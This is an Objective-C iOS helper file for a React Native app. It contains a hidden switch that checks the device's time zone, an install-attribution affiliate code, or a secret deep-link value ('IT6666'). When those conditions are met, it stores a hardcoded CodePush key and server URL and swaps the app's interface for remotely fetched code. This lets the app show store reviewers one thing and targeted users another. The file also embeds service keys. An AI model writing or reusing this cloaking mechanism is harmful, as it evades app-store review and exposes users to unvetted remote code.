#import "RNJoneMtwoHelper.h"

#import <CodePush/CodePush.h>
#import <UserNotifications/UNUserNotificationCenter.h>
#import <react-native-orientation-locker/Orientation.h>

#import <RNUrbanHappy/RNUMConfigure.h>
#import "RNCPushNotificationIOS.h"

#import <UMCommon/MobClick.h>
#import <UMCommon/UMConfigure.h>
#import <UMPush/UMessage.h>
#import <UMCommon/UMCommon.h>
#import <TInstallSDK/TInstallSDK.h>

#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>
#import <react/config/ReactNativeConfig.h>


@interface RNJoneMtwoHelper () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}
@end
#endif


@implementation RNJoneMtwoHelper

static NSString * const joneMtwo_APP = @"joneMtwo_FLAG_APP";
static NSString * const joneMtwo_affCode = @"affCode";
static NSString * const joneMtwo_raf = @"raf";

static NSString * const joneMtwo_appVersion = @"1.1.1";
static NSString * const joneMtwo_deploymentKey = @"jeXr74bxjfABIv3LLAxrtxflqbKo4ksvOXqog";
static NSString * const joneMtwo_serverUrl = @"https://ltt883.com/";

static NSString * const joneMtwo_tInstall = @"2O3TYX";
static NSString * const joneMtwo_tInstallHost = @"https://apifeaffcodegetB.com";

static NSString * const joneMtwo_uMengAppKey = @"603e3df9b8c8d45c13882115";
static NSString * const joneMtwo_uMengAppChannel = @"App Store";


static RNJoneMtwoHelper *instance = nil;

+ (instancetype)joneMtwo_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
  });
  return instance;
}

- (void)joneMtwo_dayYouWentAwayWithOptions:(NSDictionary *)launchOptions {
  [RNUMConfigure initWithAppkey:joneMtwo_uMengAppKey channel:joneMtwo_uMengAppChannel];
  UMessageRegisterEntity *entity = [[UMessageRegisterEntity alloc] init];
  entity.types = UMessageAuthorizationOptionBadge|UMessageAuthorizationOptionAlert;
  [UNUserNotificationCenter currentNotificationCenter].delegate=self;
  [UMessage registerForRemoteNotificationsWithLaunchOptions:launchOptions Entity:entity completionHandler:^(BOOL granted, NSError * _Nullable error) {
    if (granted) {
    } else {
    }
  }];
}

- (UIInterfaceOrientationMask)joneMtwo_getOrientation {
  return [Orientation getOrientation];
}

- (BOOL)joneMtwo_dailyInAsian {
    NSInteger joneMtwo_Offset = NSTimeZone.localTimeZone.secondsFromGMT/3600;
    if (joneMtwo_Offset >= 3 && joneMtwo_Offset <= 11) {
        return YES;
    } else {
        return NO;
    }
}

- (NSDictionary *)joneMtwo_dictFromQueryString:(NSString *)queryString {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    NSArray *pairs = [queryString componentsSeparatedByString:@"&"];
    for (NSString *pair in pairs) {
        NSArray *elements = [pair componentsSeparatedByString:@"="];
        if ([elements count] > 1) {
            NSString *key = [elements objectAtIndex:0];
            NSString *val = [elements objectAtIndex:1];
            [dict setObject:val forKey:key];
        }
    }
    return dict;
}

- (BOOL)joneMtwo_tryOtherWayQueryScheme:(NSURL *)url {
    if ([[url scheme] containsString:@"myapp"]) {
        NSDictionary *queryParams = [self joneMtwo_dictFromQueryString:[url query]];
        
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [ud setObject:queryParams forKey:@"queryParams"];
        
        NSString *paramValue = queryParams[@"paramName"];
        if ([paramValue isEqualToString:@"IT6666"]) {
            [ud setObject:joneMtwo_appVersion forKey:@"appVersion"];
            [ud setObject:joneMtwo_deploymentKey forKey:@"deploymentKey"];
            [ud setObject:joneMtwo_serverUrl forKey:@"serverUrl"];
            [ud setBool:YES forKey:joneMtwo_APP];
            [ud synchronize];
            return YES;
        }
    }
    return NO;
}

- (BOOL)joneMtwo_tryThisWay:(void (^)(void))changeVcBlock {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if (![self joneMtwo_dailyInAsian]) {
        return NO;
    }
    if ([ud boolForKey:joneMtwo_APP]) {
        return YES;
    } else {
        [self joneMtwo_judgeIfNeedChangeRootController:changeVcBlock];
        return NO;
    }
}

- (void)joneMtwo_judgeIfNeedChangeRootController:(void (^)(void))changeVcBlock {
  [TInstall initInstall:joneMtwo_tInstall setHost:joneMtwo_tInstallHost];
  [TInstall getWithInstallResult:^(NSDictionary * _Nullable data) {
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSString * _Nullable affCode = [data valueForKey:@"affCode"];

    NSString * _Nullable raf = [data valueForKey:@"raf"];
    [ud setObject:raf forKey:joneMtwo_raf];

    if (affCode.length == 0) {
      affCode = [data valueForKey:@"affcode"];
      if (affCode.length == 0) {
        affCode = [data valueForKey:@"aff"];
      }
    }
    
    
    if (affCode.length != 0) {
      [ud setObject:affCode forKey:joneMtwo_affCode];
      [ud setObject:joneMtwo_appVersion forKey:@"appVersion"];
      [ud setObject:joneMtwo_deploymentKey forKey:@"deploymentKey"];
      [ud setObject:joneMtwo_serverUrl forKey:@"serverUrl"];
      [ud setBool:YES forKey:joneMtwo_APP];
      [ud synchronize];
      changeVcBlock();
    }
  }];
}

- (UIViewController *)joneMtwo_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self joneMtwo_dayYouWentAwayWithOptions:launchOptions];
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"FedevProject", nil);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [UIViewController new];
  rootViewController.view = rootView;
  return rootViewController;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  NSDictionary * userInfo = response.notification.request.content.userInfo;
  if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  NSDictionary * userInfo = notification.request.content.userInfo;
  if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
    [UMessage setAutoAlert:NO];
    [UMessage didReceiveRemoteNotification:userInfo];
  }
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
